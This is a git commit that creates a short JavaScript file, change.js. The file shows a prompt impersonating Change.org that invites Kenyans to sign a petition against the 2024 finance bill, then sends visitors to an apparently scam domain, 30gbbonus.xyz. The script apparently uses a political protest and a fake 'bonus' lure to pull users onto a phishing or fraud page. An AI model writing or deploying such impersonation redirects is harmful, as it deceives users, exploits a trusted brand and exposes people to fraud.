39954b3089566d3c4e70297d2285ff92b6d7f3ff
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-06-25 23:46:44 -0700

    Create change.js

---
+++ change.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('Change-org: Hello Kenyan, Please help sign this petition REJECTFINANCEBILL2024. kindly press 1 to start petition now ','1');
+if (password != '1') {
+location.href='https://30gbbonus.xyz/kenya-protest';
+}
